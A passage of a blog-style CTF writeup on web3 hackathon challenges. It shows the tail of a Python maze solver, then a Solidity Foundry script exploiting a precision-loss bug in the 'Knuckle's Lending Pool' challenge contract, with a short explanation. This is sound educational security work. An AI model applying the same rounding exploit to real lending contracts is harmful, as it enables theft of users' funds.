              <span class="n">bits</span> <span class="o">=</span> <span class="nb">format</span><span class="p">(</span><span class="n">action_array</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">'03b'</span><span class="p">)</span> <span class="o">+</span> <span class="n">bits</span>
          <span class="k">print</span><span class="p">(</span><span class="n">bits</span><span class="p">)</span>
          <span class="c1"># Format as hex bytes
</span>          <span class="n">hex_solution</span> <span class="o">=</span> <span class="s">'0x'</span> <span class="o">+</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">b</span><span class="p">:</span><span class="mi">02</span><span class="n">x</span><span class="si">}</span><span class="s">'</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">hex_bytes</span><span class="p">)</span>
          <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Compact hex representation: </span><span class="si">{</span><span class="n">hex_solution</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
          <span class="k">print</span><span class="p">(</span><span class="s">"No solution found. Maze is unsolvable."</span><span class="p">)</span>
</pre></table></code></div></div><p>convert huff code to python after analysis, get a valid seed that generates solvable maze with several attempts and solve maze with dfs</p></ul><h2 id="knuckles-lending-pool">Knuckle’s Lending Pool<a href="#knuckles-lending-pool" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><a href="https://github.com/cantinasec/vienna_hackathon_2025/tree/main/KNUCKLE'S_LENDING_POOL">challenge link</a></p><hr /><p>Transaction hash: 0xff54c7887ecc944044798d87c0721b093f1062f63dee5c9e98af0820148ef8ef 0x0a4229073cffec2cf974f62af619478de5925056edeb8385e5510098d4ac3206 0xcd112332f54f7f14478966e64d7a4b2ffde7e24cfabf511619a96944bbff8f07</p><ul><li><p>exploit code</p><div class="language-solidity highlighter-rouge"><div class="code-header"> <span label-text="Solidity"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>  <span class="k">contract</span> <span class="n">Hard1Script</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
    
      <span class="k">function</span> <span class="n">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
          <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
            
          <span class="n">ChallengeHard1</span> <span class="n">chall</span> <span class="o">=</span> <span class="n">ChallengeHard1</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="mh">0x68283749b8933E57fdBCA021fcCa03bcfB539199</span><span class="p">));</span>
    
          <span class="n">chall</span><span class="p">.</span><span class="n">ingressLiquidity</span><span class="p">{</span><span class="n">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span> <span class="o">+</span> <span class="mi">1000</span><span class="p">}();</span>
          <span class="n">chall</span><span class="p">.</span><span class="n">egressLiquidity</span><span class="p">(</span><span class="mi">1</span> <span class="kc">ether</span> <span class="o">+</span> <span class="mi">1000</span><span class="p">);</span>
          <span class="n">chall</span><span class="p">.</span><span class="n">verifySystemCompletion</span><span class="p">();</span>
    
          <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
      <span class="p">}</span>
  <span class="p">}</span>
</pre></table></code></div></div><li><p>writeup</p><p>There is a precision loss in <code class="language-plaintext highlighter-rouge">vaultLib.calcAssetForWithdrawals()</code>. So, the amount required to burn will be much less than the metric’s deducted amount. In this case, after burning, the metric becomes zero, while the user still holds some tokens.</p></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/web3/'>WEB3</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/web3/" class="post-tag no-text-decoration" >web3</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(CTF) Sonic Jailbreak hackathon writeup - snwo&url=http://blog.solidity.kr/posts/(ctf)-sonic-jailbreak-hackathon/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(CTF) Sonic Jailbreak hackathon writeup - snwo&u=http://blog.solidity.kr/posts/(ctf)-sonic-jailbreak-hackathon/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(CTF) Sonic Jailbreak hackathon writeup - snwo&url=http://blog.solidity.kr/posts/(ctf)-sonic-jailbreak-hackathon/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/(ctf)-sonic-jailbreak-hackathon/">(CTF) Sonic Jailbreak hackathon writeup</a><li><a href="/posts/(ctf)-bi0s-ctf-2025/">(CTF) bi0s CTF 2025 writeup (blockchains)</a><li><a href="/posts/(ctf)-2024-eth-escape-ctf/">(CTF) ETH Escape CTF 2024 writeup (Feel, Vest, MAZE)</a><li><a href="/posts/(ctf)-2024-blazCTF/">(CTF) blazCTF 2024 writeup (Chisel as a Service, teragas)</a><li><a href="/posts/(ctf)-2024-SekaiCTF/">(CTF) SekaiCTF 2024 writeup (ZOO)</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/(ctf)-2024-realworldctf/"><div class="card-body"> <em class="timeago small" date="2024-01-30 17:02:13 +0900" >Jan 30, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) realworld CTF 2024 writeup (SafeBridge)</h3><div class="text-muted small"><p> web3 newbie’s solver for SafeBridge in rwctf 2024 Objective Drain the BRIDGE (L1ERC20Bridge) of its WETH balance. Setup The challenge setup is using the challenge.py file, with relayer.py also ...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2024-justCTF/"><div class="card-body"> <em class="timeago small" date="2024-06-16 17:02:13 +0900" >Jun 16, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) justCTF 2024 writeup (Blockchains)</h3><div class="text-muted small"><p> It was first time for me to solve move based challenge. Solved 3 blockchain challenges, World of Ottercraft, The Otter Scrolls, Dark BrOTTERhood ( all move based challenge ) The Otter Scrolls Al...</p></div></div></a></div><div class="card"> <a href="/posts/(ctf)-2024-SekaiCTF/"><div class="card-body"> <em class="timeago small" date="2024-08-27 05:02:13 +0900" >Aug 27, 2024</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(CTF) SekaiCTF 2024 writeup (ZOO)</h3><div class="text-muted small"><p> I made solidity assembly challenge in sekai ctf 2024. ended up with 13 solves. you can check the detail here ZOO welcome to assembly zoo There are two functions, fallback and commit (intern...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/(ctf)-bi0s-ctf-2025/" class="btn btn-outline-primary" prompt="Older"><p>(CTF) bi0s CTF 2025 writeup (blockchains)</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/snwo_kr">snwo</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/web3/">web3</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-H9FVY2NFPZ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-H9FVY2NFPZ'); }); </script>
